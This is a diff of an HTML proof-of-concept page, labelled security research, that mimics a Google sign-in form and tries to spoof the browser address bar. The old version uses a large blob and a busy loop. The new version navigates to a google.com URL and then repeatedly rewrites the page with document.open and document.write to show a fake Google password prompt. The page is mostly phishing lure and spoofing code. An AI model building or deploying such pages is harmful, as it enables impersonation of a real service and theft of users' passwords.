@@ -2,51 +2,58 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Security Research</title>
+    <title>Security Research PoC</title>
     <style>
-        body { font-family: sans-serif; text-align: center; padding: 40px 20px; background: #fff; }
+        body { font-family: sans-serif; text-align: center; padding: 40px 20px; }
         .box { border: 1px solid #dadce0; padding: 25px; border-radius: 8px; max-width: 350px; margin: 0 auto; }
-        .btn { background: #1a73e8; color: white; border: none; padding: 15px 30px; border-radius: 4px; font-size: 16px; width: 100%; cursor: pointer; }
+        .btn { background: #1a73e8; color: white; border: none; padding: 15px 30px; border-radius: 4px; font-size: 16px; width: 100%; }
         input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
     </style>
 </head>
 <body>
 
     <div id="ui">
-        <h2>Verify Account</h2>
-        <p>Please confirm your Google credentials to continue.</p>
+        <h2>System Alert</h2>
+        <p>Please re-authenticate to maintain your session.</p>
         <div class="box">
             <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="90">
             <h3>Sign in</h3>
             <input type="email" placeholder="Email or phone">
             <input type="password" placeholder="Enter your password">
-            <button class="btn" onclick="startSpoof()">Sign In</button>
+            <button class="btn" onclick="masterSpoof()">Sign In</button>
         </div>
     </div>
 
     <script>
-        function startSpoof() {
-            // 1. We create a MASSIVE "Blob" in the phone's memory.
-            // This forces the Renderer process to struggle with memory allocation.
-            const heavyData = new Uint8Array(10 * 1024 * 1024).fill(0x41); // 10MB of 'A's
-            const blob = new Blob([heavyData], {type: 'text/html'});
-            const blobUrl = URL.createObjectURL(blob);
+        function masterSpoof() {
+            // 1. We trigger a navigation to a non-existent page on the target
+            // This makes the browser 'commit' the URL but wait for the 404
+            const target = "https://myaccount.google.com/error_404_trigger_" + Math.random();
+            
+            // 2. We use the 'Double-Jump'
+            // We navigate, then immediately try to 'open' the document back up
+            window.location.href = target;
 
-            // 2. Trigger navigation to the REAL Google site.
-            // We append the Blob URL as a fragment to confuse the URL parser.
-            window.location.href = "https://myaccount.google.com/#" + blobUrl;
+            // 3. The Race
+            // We use a recurring timer to try and 'hijack' the page 
+            // as the URL bar is changing.
+            let attempts = 0;
+            const hack = setInterval(() => {
+                attempts++;
+                // document.open() clears the 'new' page and lets us write our 'old' content
+                document.open();
+                document.write(`
+                    <div style="font-family:sans-serif; text-align:center; padding-top:100px;">
+                        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="90">
+                        <h1>SPOOF SUCCESSFUL</h1>
+                        <p>Look at your URL bar. If it says google.com, you win.</p>
+                        <input type="password" placeholder="Enter password again">
+                    </div>
+                `);
+                document.close();
 
-            // 3. The "Sync-Lock" loop.
-            // We freeze the UI thread for 3 seconds. 
-            // While the phone is "frozen," the Browser Process will update the 
-            // URL bar to google.com, but it won't be able to clear the screen yet.
-            const start = Date.now();
-            while (Date.now() - start < 3000) {
-                // This 'Busy' loop creates the 3-second window for your screenshot.
-            }
-
-            // 4. Clean up
-            setTimeout(() => URL.revokeObjectURL(blobUrl), 5000);
+                if (attempts > 50) clearInterval(hack);
+            }, 10); // Try every 10 milliseconds
         }
     </script>
 </body>
